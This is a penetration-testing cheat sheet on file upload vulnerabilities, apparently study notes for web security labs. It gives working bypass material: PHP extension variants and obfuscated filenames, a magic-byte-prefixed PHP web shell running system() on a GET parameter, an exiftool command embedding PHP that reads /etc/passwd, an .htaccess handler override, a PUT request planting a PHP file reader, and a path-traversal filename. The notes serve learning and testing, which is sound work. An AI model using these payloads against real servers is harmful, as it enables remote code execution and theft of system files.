---
title: "File upload vulnerabilities"
weight: 9
---

# File upload vulnerabilities

{{< hint style=warning >}}
TO CHANGE
Servers typically won't execute files unless they have been configured to do so. In some cases the contents of the file may still be served as plain text.
{{< /hint >}}

## Flawed validation of FU

### Content-Type

{{< details summary="multipart form-data" >}}

When we upload binary files (like png) the content type multipart/form-data is preferred. The message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header and may also contain their own `Content-Type` header which tells the server the MIME type of the data that was submitted using this input

{{< /details >}}

Change `Content-Type` to an allow MIME type. (e.g. `image/jpeg`)

### Blacklisted extensions

* Change extensions

```sh
.php
.php3
.php4
.php5
.phtml
.phar
```

* Obfuscating file extensions

```sh
exploit.pHp
exploit.php.jpg
exploit.php.
exploit%2Ephp
exploit.asp;.jpg
exploit.asp%00.jpg
exploit.p.phphp
```

### File content validation

More secure servers try to verify that the contents of the file actually match what is expected.

**[1] Magic number: certain file types may always contain a specific sequence of bytes in their header or footer**

| File     | Hex Signature                       | ISO 8859-1   |
| -------- | ----------------------------------- | ------------ |
| PNG      | 89 50 4E 47 0D 0A 1A 0A             | ‰PNG␍␊␚␊     |
| JPG/JPEG | FF D8 FF EE                         | ÿØÿî         |
| JPG/JPEG | FF D8 FF E0                         | ÿØÿà         |
| JPG/JPEG | FF D8 FF E0 00 10 4A 46 49 46 00 01 | ÿØÿà␀␐JFIF␀␁ |
| PDF      | 25 50 44 46 2D                      | %PDF-        |

Payload example:

```php
ÿØÿî
<?php echo system($_GET['cmd']); ?>
```

***

**[2] Polyglot (on exiftool): verify certain intrinsic properties of an image, such as its dimensions.**

Create a polyglot JPEG file containing malicious code within its metadata

```sh
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
```

This works if you can upload a php extension file. This works why you have a real image file (that bypass rescritions) but when you open the image it's executed as php script.

## Overriding server configuration

Many servers allow configuration files in directories to override global settings. Web servers use them when present, but they're not accessible via HTTP requests.

If the file extension is blacklisted, you might trick the server into mapping a custom file extension to an executable MIME type.

* Apache servers -> `.htaccess`
* Example: `AddType application/x-httpd-php .<EXTENSION>`

## PUT method

```http
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php
Content-Length: 49

<?php echo file_get_contents('/path/to/file'); ?>
```

## FU + PT

Defense: Servers block script execution in the file upload folder. Web servers use the filename field in `multipart/form-data` requests to determine the file's name and location. -> Change filename field combining path traversal

```http
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
```

{{< hint style=tips >}}
**Tip**: pay attention to stripping. In that case, obfuscate with `filename="..%2fexploit.php"`.
{{< /hint >}}

## FU without RCE

If you can upload HTML files or SVG images, you can use tags to create stored XSS payloads. If the server parses XML-based files like `.doc` or `.xls`, it could be a vector for XXE injection attacks.

## FU + Race Conditions

Some websites upload files to the main filesystem and remove them if they fail validation. This is common in sites using anti-virus software to check for malware. During the short time the file exists on the server, an attacker could potentially execute it.

* Race conditions
* Difficult to detect

### Race conditions in URL-based file uploads

If a file is loaded into a temporary directory with a randomized name, it should be impossible for an attacker to exploit any race conditions.

* If the randomized directory name is generated using pseudo-random functions like PHP's `uniqid()`, it can potentially be brute-forced.
  * Try to extend the amount of time taken to process the file by uploading a larger file
* If it is processed in chunks, you can potentially take advantage of this by creating a malicious file with the payload at the start, followed by a large number of arbitrary padding bytes.
